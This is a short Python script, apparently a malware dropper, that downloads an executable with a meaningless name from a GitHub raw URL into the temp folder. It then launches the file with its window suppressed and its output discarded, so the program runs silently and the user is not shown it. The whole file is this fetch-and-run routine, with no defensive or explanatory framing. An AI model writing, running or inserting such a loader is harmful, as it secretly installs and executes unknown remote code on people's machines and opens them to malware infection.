# launcher_exe_click.py
import os, tempfile, requests, certifi, subprocess, sys

URL  = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui.exe"
NAME = "dikdui.exe"

def main():
    p = os.path.join(tempfile.gettempdir(), NAME)

    with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
        r.raise_for_status()
        with open(p, "wb") as f:
            for chunk in r.iter_content(1<<15):
                if chunk:
                    f.write(chunk)

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    CREATE_NO_WINDOW = 0x08000000

    subprocess.Popen(
        [p],
        startupinfo=si,
        creationflags=CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

if __name__ == "__main__":
    main()
